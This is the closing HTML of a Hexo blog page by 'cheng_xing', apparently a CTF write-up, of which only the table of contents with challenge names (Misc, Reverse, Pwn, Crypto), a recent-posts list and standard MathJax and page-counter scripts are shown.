class="toc-text">As I’ve written</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Misc"><span class="toc-number">2.</span> <span class="toc-text">Misc</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Lab-Report"><span class="toc-number">2.1.</span> <span class="toc-text">Lab Report</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#macro-magic"><span class="toc-number">2.2.</span> <span class="toc-text">macro magic</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#bingo"><span class="toc-number">2.3.</span> <span class="toc-text">bingo</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Reverse"><span class="toc-number">3.</span> <span class="toc-text">Reverse</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#hello-reverse"><span class="toc-number">3.1.</span> <span class="toc-text">hello-reverse</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Thread%E4%B9%8B%E6%AD%8C"><span class="toc-number">3.2.</span> <span class="toc-text">Thread之歌</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Hej"><span class="toc-number">3.3.</span> <span class="toc-text">Hej!</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#happyhap"><span class="toc-number">3.4.</span> <span class="toc-text">happyhap</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#AST"><span class="toc-number">3.5.</span> <span class="toc-text">AST</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Min-re-ctf-Godot-Edition"><span class="toc-number">3.6.</span> <span class="toc-text">Min(re)ctf Godot Edition</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Pwn"><span class="toc-number">4.</span> <span class="toc-text">Pwn</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#who-am-i"><span class="toc-number">4.1.</span> <span class="toc-text">who_am_i</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2048"><span class="toc-number">4.2.</span> <span class="toc-text">2048</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Crypto"><span class="toc-number">5.</span> <span class="toc-text">Crypto</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#crypt-it"><span class="toc-number">5.1.</span> <span class="toc-text">crypt-it</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#prng"><span class="toc-number">5.2.</span> <span class="toc-text">prng</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#paillier"><span class="toc-number">5.3.</span> <span class="toc-text">paillier</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#easy-poly"><span class="toc-number">5.4.</span> <span class="toc-text">easy_poly</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#prng-study-plus-2"><span class="toc-number">5.5.</span> <span class="toc-text">prng study plus 2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Curve2"><span class="toc-number">5.6.</span> <span class="toc-text">Curve2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#random"><span class="toc-number">5.7.</span> <span class="toc-text">random</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Welcome"><span class="toc-number">6.</span> <span class="toc-text">Welcome</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AD%BE%E5%88%B0%E9%A2%98"><span class="toc-number">6.1.</span> <span class="toc-text">签到题</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%B9%E5%99%A8%E9%A2%98%E8%AF%B4%E6%98%8E"><span class="toc-number">6.2.</span> <span class="toc-text">容器题说明</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AD%BE%E9%80%80%E9%97%AE%E5%8D%B7"><span class="toc-number">6.3.</span> <span class="toc-text">签退问卷</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/12/02/20251202%E9%9A%8F%E7%BC%98%E5%88%B7%E9%A2%98/" title="20251202随缘刷题">20251202随缘刷题</a><time datetime="2025-12-01T16:26:54.000Z" title="发表于 2025-12-02 00:26:54">2025-12-02</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/12/01/%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/" title="原型链污染">原型链污染</a><time datetime="2025-12-01T01:54:55.000Z" title="发表于 2025-12-01 09:54:55">2025-12-01</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/11/28/20251128%E8%AE%BA%E6%96%87%E5%AD%A6%E4%B9%A0/" title="20251128论文学习">20251128论文学习</a><time datetime="2025-11-28T02:24:00.000Z" title="发表于 2025-11-28 10:24:00">2025-11-28</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/11/05/0xGame2025/" title="0xGame2025">0xGame2025</a><time datetime="2025-11-05T10:51:18.000Z" title="发表于 2025-11-05 18:51:18">2025-11-05</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/11/04/%E5%BC%BA%E7%BD%91%E6%9D%AFS9-web/" title="强网杯S9-web">强网杯S9-web</a><time datetime="2025-11-04T06:24:51.000Z" title="发表于 2025-11-04 14:24:51">2025-11-04</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url(/img/hk.jpg);"><div class="footer-other"><div class="footer-copyright"><span class="copyright">&copy;2025 By cheng_xing</span><span class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo 7.3.0</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly 5.4.0-b1</a></span></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><div class="js-pjax"><script>(() => {
  const loadMathjax = () => {
    if (!window.MathJax) {
      window.MathJax = {
        tex: {
          inlineMath: [['$', '$'], ['\\(', '\\)']],
          tags: 'none',
        },
        chtml: {
          scale: 1.1
        },
        options: {
          enableMenu: true,
          renderActions: {
            findScript: [10, doc => {
              for (const node of document.querySelectorAll('script[type^="math/tex"]')) {
                const display = !!node.type.match(/; *mode=display/)
                const math = new doc.options.MathItem(node.textContent, doc.inputJax[0], display)
                const text = document.createTextNode('')
                node.parentNode.replaceChild(text, node)
                math.start = {node: text, delim: '', n: 0}
                math.end = {node: text, delim: '', n: 0}
                doc.math.push(math)
              }
            }, '']
          }
        }
      }

      const script = document.createElement('script')
      script.src = 'https://cdn.jsdelivr.net/npm/mathjax/es5/tex-mml-chtml.min.js'
      script.id = 'MathJax-script'
      script.async = true
      document.head.appendChild(script)
    } else {
      MathJax.startup.document.state(0)
      MathJax.texReset()
      MathJax.typesetPromise()
    }
  }

  btf.addGlobalFn('encrypt', loadMathjax, 'mathjax')
  window.pjax ? loadMathjax() : window.addEventListener('load', loadMathjax)
})()</script></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>